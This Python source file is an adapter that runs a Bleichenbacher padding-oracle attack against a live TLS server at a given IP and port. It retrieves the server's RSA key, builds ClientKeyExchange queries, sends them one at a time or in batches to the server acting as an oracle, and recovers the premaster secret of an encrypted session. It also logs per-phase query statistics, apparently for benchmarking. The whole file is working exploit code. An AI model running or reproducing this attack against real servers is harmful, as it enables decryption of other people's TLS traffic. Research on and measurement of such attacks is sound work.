"""TLS adapter for sequential and batched runs of the shared attack."""

import json
import time

from reversebleichenbacher import ProofAttack, QueryResult, SequentialExecutor
from reversebleichenbacher.core import AttackConfig

from tls_transport import TLSOracle, ch, configure_oracle, get_rsa_from_server, make_cke_prefix


class TLSSequentialExecutor(SequentialExecutor):
    """Track TLS requests and round trips by attack phase."""

    def __init__(self, oracle):
        super().__init__(oracle.query)
        self.oracle = oracle
        self.phase = "init"
        self.oracle_queries = {"init": oracle.calls}
        self.round_trips = {"init": oracle.round_trips}

    def set_phase(self, phase):
        self.phase = phase
        self.oracle_queries.setdefault(phase, 0)
        self.round_trips.setdefault(phase, 0)

    def query(self, multiplier):
        before_queries = self.oracle.calls
        before_round_trips = self.oracle.round_trips
        try:
            return super().query(multiplier)
        finally:
            self.oracle_queries[self.phase] += self.oracle.calls - before_queries
            self.round_trips[self.phase] += self.oracle.round_trips - before_round_trips


class TLSBatchExecutor(TLSSequentialExecutor):
    """Submit one bounded window and return each reply with its candidate."""

    batch_size = 256

    def execute_batch(self, candidates):
        before_queries = self.oracle.calls
        before_round_trips = self.oracle.round_trips
        work = self.oracle.submit(
            [(candidate.multiplier, candidate) for candidate in candidates]
        )
        self._submitted_queries += len(work)
        self.oracle_queries[self.phase] += self.oracle.calls - before_queries
        self.round_trips[self.phase] += self.oracle.round_trips - before_round_trips
        try:
            for candidate, accepted in self.oracle.as_completed(work):
                yield QueryResult(candidate, accepted)
        finally:
            self.oracle.cancel(work)


class SharedTLSAttack:
    def __init__(self, ip, port, rsa, prefix, test_oracle=False, parallel=False,
                 bottom_up_batch_bits=None):
        self.ip = ip
        self.port = port
        self.rsa = rsa
        self.prefix = prefix
        self.test_oracle = test_oracle
        self.parallel = parallel
        self.bottom_up_batch_bits = bottom_up_batch_bits

    @staticmethod
    def premaster_secret(recovered_suffix):
        """Restore the TLS version and preserve all 46 recovered suffix bytes."""
        return b"\x03\x03" + recovered_suffix.to_bytes(46, "big")

    def decrypt(self, encrypted):
        started = time.monotonic()
        oracle = None
        executor = None
        attack = ProofAttack(bottom_up_batch_bits=self.bottom_up_batch_bits)
        attack.init_process("FFT", self.rsa.bits,
                            AttackConfig.optimized("FFT", self.rsa.bits),
                            parallel=self.parallel)
        error = None
        secret = None
        try:
            oracle = TLSOracle(None, self.ip, self.port, ch, self.prefix,
                               self.rsa.e, self.rsa.N, encrypted)
            configure_oracle(oracle, self.rsa, quiet=True, test=self.test_oracle)
            executor_class = TLSBatchExecutor if self.parallel else TLSSequentialExecutor
            executor = executor_class(oracle)
            secret, _ = attack.attack(executor, self.rsa.N)
            return secret
        except Exception as exc:
            error = exc
            raise
        finally:
            if oracle is None:
                queries = {"init": 0}
                round_trips = {"init": 0}
                phase = "init"
            elif executor is None:
                queries = {"init": oracle.calls}
                round_trips = {"init": oracle.round_trips}
                phase = "init"
            else:
                queries = executor.oracle_queries
                round_trips = executor.round_trips
                phase = executor.phase
            result = "ok" if error is None else phase
            stats = {
                "oracle_queries": queries,
                "round_trips": round_trips,
                "step": "done" if error is None else phase,
                "error": str(error),
                "exception_type": type(error).__name__ if error else None,
                "result": result,
                "total_queries": oracle.calls if oracle else 0,
                "total_round_trips": oracle.round_trips if oracle else 0,
                "debug_statistics": None,
                "runtime": time.monotonic() - started,
                "tau": attack.tau_found,
            }
            with open("results.json", "w") as output:
                json.dump(stats, output)
            if oracle is not None:
                oracle.executor.shutdown(wait=False, cancel_futures=True)


def bleichenbacher_attack_tls(ip, port, quiet=False, benchmark=False,
                              early_abort=False, test_oracle=False, parallel=False):
    rsa = get_rsa_from_server(ip, port)
    prefix = make_cke_prefix(rsa)
    if not quiet:
        diagnostic = TLSOracle(None, ip, port, ch, prefix, rsa.e, rsa.N, 0)
        try:
            configure_oracle(diagnostic, rsa, quiet=False, test=test_oracle)
        finally:
            diagnostic.executor.shutdown(wait=False, cancel_futures=True)
    return SharedTLSAttack(ip, port, rsa, prefix,
                           test_oracle=test_oracle, parallel=parallel)
